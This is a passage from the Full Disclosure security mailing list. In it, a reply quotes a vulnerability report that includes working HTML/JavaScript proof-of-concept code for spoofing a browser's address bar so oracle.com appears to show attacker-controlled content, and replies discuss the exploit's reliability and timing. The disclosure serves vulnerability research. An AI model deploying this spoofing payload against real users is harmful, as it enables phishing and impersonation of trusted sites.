The success of the exploit seems to depend on if the browser can start loading content.html fast enough. I noticed that the exploit works of the time when used locally.

That, or perhaps reducing the interval time for trying to run next() after the popup is created. >  > I wonder if this works on any other browsers? >  > MustafaOn 30 Jun am, David Leo <david.leo@...sen.co.uk> wrote: >>  >> Impact:  >> The "click to verify" thing is completely broken...  >> Anyone can be "BBB Accredited Business" etc.  >> You can make whitehouse.gov display "We love Islamic State" :-)  >>  >> Note:  >> No user interaction on the fake page.  >>  >> Code:  >> ***** index.html  >> <script>  >> function next()  >> {  >> w.location.replace('http://www.oracle.com/index.html?'+n);n++;  >> setTimeout("next();",15);  >> setTimeout("next();",25);  >> }  >> function f()  >> {  >>  >> i=setInterval("try{x=w.location.href;}catch(e){clearInterval(i);n=0;next();}",5);  >> }  >> </script>  >> <a href="#" onclick="f()">Go</a><br>  >> ***** content.html  >> <b>This web page is NOT oracle.com</b>  >> <script>location="http://www.oracle.com/index.html";</script>  >> ***** It's online  >>  >> (The page says - it works as we tested today)  >>  >> Request For Comment:  >> We reported this to Google.  >> They reproduced, and say  >> It's DoS which doesn't matter.  >> We think it's very strange,  >> since the browser does not crash(not DoS),  >> and the threat is obvious.  >> What's your opinion?  >>  >> Kind Regards,  >>  >> PS  >> We love clever tricks.  >> We love this:  >> http://dieyu.org/  >>  >>  >> _______________________________________________  >> Sent through the Full Disclosure mailing list  >> https://nmap.org/mailman/listinfo/fulldisclosure  >> Web Archives & RSS: http://seclists.org/fulldisclosure/ >  > _______________________________________________ > Sent through the Full Disclosure mailing list > https://nmap.org/mailman/listinfo/fulldisclosure > Web Archives & RSS: http://seclists.org/fulldisclosure/  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
